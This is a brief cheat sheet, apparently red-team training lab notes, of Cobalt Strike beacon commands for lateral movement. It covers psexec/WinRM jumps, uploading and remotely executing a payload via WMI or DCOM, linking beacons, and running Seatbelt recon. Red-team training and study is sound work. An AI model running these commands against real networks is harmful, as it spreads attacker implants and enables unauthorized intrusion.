# Lateral Movement

# using Jump

    beacon> jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener

# Using remote exec

    beacon> remote-exec psexec/winrm/wmi ComputerName <uploaded binary on remote system>

# Example Windows Management Instrumentation (WMI)

    beacon> cd \\web.dev.cyberbotic.io\ADMIN$
    beacon> upload C:\Payloads\smb_x64.exe
    beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
    beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

# Executing .Net binary remotely 

    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

# Invoke DCOM (better opsec)

    beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
    beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
    beacon> link web.dev.cyberbotic.io agent_vinod

NOTE: While using remote-exec for lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary for execution 
